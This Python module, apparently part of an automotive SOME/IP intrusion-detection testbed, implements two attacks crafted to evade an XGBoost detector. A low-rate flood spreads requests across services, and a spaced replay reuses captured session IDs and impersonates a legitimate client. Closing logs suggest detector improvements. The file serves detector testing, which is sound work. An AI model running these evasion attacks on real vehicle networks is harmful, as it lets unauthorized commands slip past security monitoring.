"""
Adversarial evasion attacks — designed to slip under the detector's thresholds.

Unlike the "loud" attacks (flood, replay, spoofed_offer, malformed_sd),
these are crafted specifically to evade the XGBoost model by staying
within normal-looking feature boundaries in any single 2-second window.

Two evasion strategies:
  1. Slow Flood — sends requests at a rate just below the detector's
     learned threshold, spread across all known services so no single
     service looks anomalous.
  2. Spaced Replay — reuses stale session IDs but spaces them out across
     multiple windows so no individual window shows low session entropy.

Usage:
    python -m attacks.evasion --strategy slow_flood --duration 30
    python -m attacks.evasion --strategy spaced_replay --duration 30
    python -m attacks.evasion --strategy both --duration 60
"""

from __future__ import annotations

import argparse
import json
import logging
import os
import random
import socket
import struct
import sys
import time
from datetime import datetime, timezone

sys.path.insert(0, os.path.join(os.path.dirname(__file__), ".."))

from proto.someip import SomeIpHeader, SomeIpMessage, pack_someip, MessageType
from proto.sd import SdEntryType, parse_sd_message
from proto.constants import SERVICES, HVAC_SERVICE_ID, MEDIA_SERVICE_ID, NAV_SERVICE_ID, SD_PORT
from client.traffic_logger import get_logger

logging.basicConfig(level=logging.INFO, format="%(asctime)s [EVASION] %(message)s")
log = logging.getLogger("Evasion")


# ======================================================================
# Strategy 1: Slow Flood
# ======================================================================

def slow_flood(
    targets: list[dict],
    duration: float = 30.0,
    rate: float = 3.0,
    logger=None,
    log_path: str = "/logs/traffic.jsonl",
):
    """Send requests at a rate that looks normal per-window.

    Key evasion techniques:
    - Rate stays at ~3 msg/s (vs normal ~1-2 msg/s, flood is 200+)
    - Rotates across all discovered services (avoids single-service spike)
    - Uses incrementing session IDs (avoids entropy anomalies)
    - Payload sizes mimic normal traffic distribution
    - Adds realistic jitter between requests

    The result: each 2-second window sees ~6 extra messages spread across
    3 services — barely above normal, well below flood threshold.
    Over 30+ seconds, the attacker sends 90+ unauthorized requests.
    """
    if not targets:
        log.error("No targets provided for slow flood")
        return

    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    session_counter = random.randint(100, 500)  # Start from a plausible range
    msg_count = 0
    start_time = time.time()

    log.info(
        "SLOW FLOOD starting: %d targets, %.1f msg/s for %.0fs (evasion mode)",
        len(targets), rate, duration,
    )

    while time.time() - start_time < duration:
        # Pick a random target to distribute load
        target = random.choice(targets)
        service_id = target["service_id"]
        target_ip = target["ip"]
        target_port = target["port"]

        # Use typical method IDs (0x0001, 0x0002)
        method_id = random.choice([0x0001, 0x0002])
        session_counter += 1  # Monotonically increasing — looks legitimate

        header = SomeIpHeader(
            service_id=service_id,
            method_id=method_id,
            client_id=0x0040,  # Different client ID to blend in
            session_id=session_counter & 0xFFFF,
            message_type=MessageType.REQUEST,
        )

        # Mimic realistic payload sizes (normal traffic is 4-16 bytes)
        payload_size = random.choice([4, 6, 8, 10, 12])
        payload = bytes(random.randint(0, 255) for _ in range(payload_size))

        msg_bytes = pack_someip(SomeIpMessage(header=header, payload=payload))

        try:
            sock.sendto(msg_bytes, (target_ip, target_port))
        except Exception:
            pass

        if logger:
            logger.log(
                header, payload, direction="sent",
                src_ip="evasion_attacker", dst_ip=target_ip,
                label="evasion_slow_flood",
            )

        msg_count += 1

        # Add realistic jitter: base interval + random variance
        base_interval = 1.0 / rate
        jitter = random.uniform(-base_interval * 0.3, base_interval * 0.3)
        time.sleep(max(0.05, base_interval + jitter))

    actual_rate = msg_count / (time.time() - start_time)
    log.info(
        "SLOW FLOOD complete: %d messages in %.1fs (%.1f msg/s — designed to evade)",
        msg_count, time.time() - start_time, actual_rate,
    )
    sock.close()
    return msg_count


# ======================================================================
# Strategy 2: Spaced Replay
# ======================================================================

def spaced_replay(
    target_ip: str = "172.20.0.10",
    target_port: int = 30501,
    service_id: int = HVAC_SERVICE_ID,
    duration: float = 30.0,
    replay_interval: float = 5.0,
    normal_padding: int = 3,
    logger=None,
    log_path: str = "/logs/traffic.jsonl",
):
    """Replay stale session IDs spaced across multiple windows.

    Key evasion techniques:
    - Only 1 replayed message every 5 seconds (spread across windows)
    - Pad with normal-looking legitimate requests between replays
    - Vary the replayed session ID slightly (not always 0x0001)
    - Use different method IDs per replay to avoid pattern matching
    - Session entropy stays high because legitimate messages dominate

    The result: the model sees ~1 stale session per window mixed with
    3-4 fresh ones, keeping session_id_entropy relatively normal.
    But over time, the attacker exercises stale commands repeatedly.
    """
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    session_counter = random.randint(200, 800)
    msg_count = 0
    replay_count = 0
    start_time = time.time()
    last_replay = start_time

    # Pool of "captured" session IDs to replay (simulate prior eavesdropping)
    captured_sessions = [0x0001, 0x0003, 0x0005, 0x0008, 0x000A]

    log.info(
        "SPACED REPLAY starting: 1 replay every %.1fs + %d padding msgs, duration=%.0fs",
        replay_interval, normal_padding, duration,
    )

    while time.time() - start_time < duration:
        now = time.time()

        if now - last_replay >= replay_interval:
            # --- Send the stale replay ---
            stale_session = random.choice(captured_sessions)
            method_id = random.choice([0x0001, 0x0002])

            header = SomeIpHeader(
                service_id=service_id,
                method_id=method_id,
                client_id=0x0010,  # Impersonate legitimate client
                session_id=stale_session,
                message_type=MessageType.REQUEST,
            )
            payload = struct.pack("!Hf", random.randint(1, 4), 22.0)
            msg_bytes = pack_someip(SomeIpMessage(header=header, payload=payload))

            try:
                sock.sendto(msg_bytes, (target_ip, target_port))
            except Exception:
                pass

            if logger:
                logger.log(
                    header, payload, direction="sent",
                    src_ip="evasion_attacker", dst_ip=target_ip,
                    label="evasion_spaced_replay",
                )

            replay_count += 1
            msg_count += 1
            last_replay = now

            log.debug(
                "REPLAY #%d: session=0x%04X method=0x%04X",
                replay_count, stale_session, method_id,
            )

            # --- Send padding requests with fresh session IDs ---
            for _ in range(normal_padding):
                session_counter += 1
                pad_header = SomeIpHeader(
                    service_id=service_id,
                    method_id=random.choice([0x0001, 0x0002]),
                    client_id=0x0040,  # Different client
                    session_id=session_counter & 0xFFFF,
                    message_type=MessageType.REQUEST,
                )
                pad_payload = struct.pack("!Hf", random.randint(1, 4), random.uniform(18, 26))
                pad_bytes = pack_someip(SomeIpMessage(header=pad_header, payload=pad_payload))

                try:
                    sock.sendto(pad_bytes, (target_ip, target_port))
                except Exception:
                    pass

                if logger:
                    logger.log(
                        pad_header, pad_payload, direction="sent",
                        src_ip="evasion_attacker", dst_ip=target_ip,
                        label="evasion_spaced_replay",
                    )

                msg_count += 1
                time.sleep(random.uniform(0.2, 0.5))

        time.sleep(0.1)

    log.info(
        "SPACED REPLAY complete: %d total msgs (%d replays, %d padding) in %.1fs",
        msg_count, replay_count, msg_count - replay_count, time.time() - start_time,
    )
    sock.close()
    return msg_count, replay_count


# ======================================================================
# Evasion analysis report
# ======================================================================

def analyze_evasion(log_path: str, output_path: str = None):
    """Analyze whether evasion attacks are detected by the trained model.

    Loads the traffic log, extracts features, and reports per-window
    detection results for evasion-labeled messages.
    """
    from detector.feature_extractor import load_traffic_log, extract_windows, FEATURE_COLUMNS

    records = load_traffic_log(log_path)
    df = extract_windows(records, window_seconds=2.0)

    if df.empty:
        log.warning("No windows extracted")
        return

    # Find evasion windows
    evasion_records = [r for r in records if "evasion" in r.get("label", "")]
    evasion_count = len(evasion_records)
    total_attack_windows = (df["label"] == 1).sum()
    total_normal_windows = (df["label"] == 0).sum()

    log.info("=" * 60)
    log.info("EVASION ANALYSIS REPORT")
    log.info("=" * 60)
    log.info("Total records: %d (evasion: %d)", len(records), evasion_count)
    log.info("Windows: %d total (%d normal, %d attack)", len(df), total_normal_windows, total_attack_windows)

    # Try loading trained model
    try:
        import xgboost as xgb
        model_path = "detector/model/xgb_model.json"
        if os.path.exists(model_path):
            model = xgb.XGBClassifier()
            model.load_model(model_path)
            X = df[FEATURE_COLUMNS].values
            probs = model.predict_proba(X)[:, 1]
            preds = (probs >= 0.5).astype(int)

            attack_windows = df[df["label"] == 1]
            if not attack_windows.empty:
                attack_indices = attack_windows.index
                detected = preds[attack_indices].sum()
                evaded = len(attack_indices) - detected
                log.info(
                    "XGBoost detection: %d/%d attack windows detected, %d EVADED",
                    detected, len(attack_indices), evaded,
                )
                evasion_rate = evaded / len(attack_indices) * 100
                log.info("Evasion success rate: %.1f%%", evasion_rate)

                # Show per-window scores for attack windows
                for i, idx in enumerate(attack_indices[:10]):
                    log.info(
                        "  Window %d: score=%.3f → %s",
                        idx, probs[idx],
                        "DETECTED" if preds[idx] == 1 else "⚠ EVADED",
                    )
        else:
            log.info("No trained model found — train with: python -m detector.train_model")
    except ImportError:
        log.info("XGBoost not installed — cannot run detection analysis")

    log.info("=" * 60)
    log.info("RECOMMENDATIONS for catching evasion attacks:")
    log.info("  1. Longer rolling window (10-30s) to catch slow floods over time")
    log.info("  2. Rate-of-change features (Δ msg_rate between consecutive windows)")
    log.info("  3. Cross-window session tracking (flag session IDs seen in past N windows)")
    log.info("  4. Isolation Forest anomaly layer (unsupervised, catches novel patterns)")
    log.info("=" * 60)


# ======================================================================
# Main
# ======================================================================

def main():
    parser = argparse.ArgumentParser(description="SOME/IP Adversarial Evasion Attack")
    parser.add_argument("--strategy", choices=["slow_flood", "spaced_replay", "both"],
                        default="both", help="Evasion strategy to use")
    parser.add_argument("--duration", type=float, default=30, help="Attack duration (seconds)")
    parser.add_argument("--log-path", default="/logs/traffic.jsonl")
    parser.add_argument("--analyze", action="store_true",
                        help="Run evasion analysis after attack")

    # Slow flood options
    parser.add_argument("--rate", type=float, default=3.0,
                        help="Slow flood: messages per second")

    # Spaced replay options
    parser.add_argument("--replay-interval", type=float, default=5.0,
                        help="Spaced replay: seconds between stale replays")
    parser.add_argument("--target-ip", default="172.20.0.10")
    parser.add_argument("--target-port", type=int, default=30501)

    args = parser.parse_args()
    logger = get_logger(args.log_path)

    # Build target list for slow flood
    targets = [
        {"service_id": sid, "ip": meta.get("ip", "172.20.0.10"), "port": meta["port"]}
        for sid, meta in SERVICES.items()
    ]
    # Add IPs based on typical Docker layout
    ip_map = {HVAC_SERVICE_ID: "172.20.0.10", MEDIA_SERVICE_ID: "172.20.0.11", NAV_SERVICE_ID: "172.20.0.12"}
    for t in targets:
        t["ip"] = ip_map.get(t["service_id"], t["ip"])

    if args.strategy in ("slow_flood", "both"):
        slow_flood(
            targets=targets,
            duration=args.duration / 2 if args.strategy == "both" else args.duration,
            rate=args.rate,
            logger=logger,
            log_path=args.log_path,
        )

    if args.strategy in ("spaced_replay", "both"):
        spaced_replay(
            target_ip=args.target_ip,
            target_port=args.target_port,
            duration=args.duration / 2 if args.strategy == "both" else args.duration,
            replay_interval=args.replay_interval,
            logger=logger,
            log_path=args.log_path,
        )

    if args.analyze:
        analyze_evasion(args.log_path)


if __name__ == "__main__":
    main()
